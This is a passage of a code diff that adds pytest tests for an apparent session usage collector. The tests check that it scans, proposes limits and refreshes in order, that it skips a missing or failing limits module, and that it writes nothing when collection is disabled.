+        if self.boom:
+            raise self.boom
+
+
+def run_inproc(tmp_path, monkeypatch, order, limits="absent", boom=None):
+    """The collector loop in this process: a session whose end marker is already there (one final scan)."""
+    Path(U.session_dir(SID), "end").write_text("1\n")
+
+    def scan_rec(*a, **k):
+        order.append("scan")
+        return REAL_SCAN(*a, **k)
+    monkeypatch.setattr(U, "scan_once", scan_rec)
+    monkeypatch.setattr(U, "refresh", lambda **k: order.append("refresh") or {})
+    monkeypatch.setitem(sys.modules, "stack_limits", None if limits == "absent" else FakeLimits(order, boom))
+    old = signal.getsignal(signal.SIGTERM)
+    try:
+        return U.run(SID, str(subdir(tmp_path)), poll=0.01)
+    finally:
+        signal.signal(signal.SIGTERM, old)
+
+
+def test_exit_order_scan_propose_refresh_and_no_limit_change(st, tmp_path, monkeypatch):
+    write_agent(subdir(tmp_path), "x1", agent_lines()[:4])
+    lim = st / "limits"
+    (lim / "snapshots").mkdir(parents=True)
+    names = ("live.json", "snapshots/%s.json" % SID)
+    for n, body in zip(names, ('{"v": 1}', '{"hash": "sha256:0"}')):
+        (lim / n).write_text(body)
+
+    def stamp():
+        return {n: ((lim / n).read_bytes(), (lim / n).stat().st_mtime_ns) for n in names}
+    before = stamp()
+    order = []
+    assert run_inproc(tmp_path, monkeypatch, order, limits="fake") == "session end"
+    assert order == ["scan", "propose", "refresh"]
+    assert (SID, "x1", 0) in rows_by_key() and stamp() == before
+    # stack_limits not importable: skipped silently, the refresh still runs
+    order.clear()
+    assert run_inproc(tmp_path, monkeypatch, order) == "session end"
+    assert order == ["scan", "refresh"]
+    # an unfinished proposer (NotImplementedError) or a failing one does not stop the refresh
+    for boom in (NotImplementedError("later"), RuntimeError("x")):
+        order.clear()
+        assert run_inproc(tmp_path, monkeypatch, order, limits="fake", boom=boom) == "session end"
+        assert order == ["scan", "propose", "refresh"]
+    assert stamp() == before
+
+
+def test_collect_off_writes_no_rows_and_no_proposals(st, tmp_path, monkeypatch):
+    monkeypatch.setenv("STACK_USAGE_COLLECT", "0")
+    write_agent(subdir(tmp_path), "x1", agent_lines()[:4])
+    order = []
+    monkeypatch.setitem(sys.modules, "stack_limits", FakeLimits(order))
+    monkeypatch.setattr(U, "refresh", lambda **k: order.append("refresh") or {})
+    assert U.run(SID, str(subdir(tmp_path))) == "disabled"
+    assert order == [] and not (st / "usage").exists()
+    assert U.hook_start(event(tmp_path)) == "disabled"
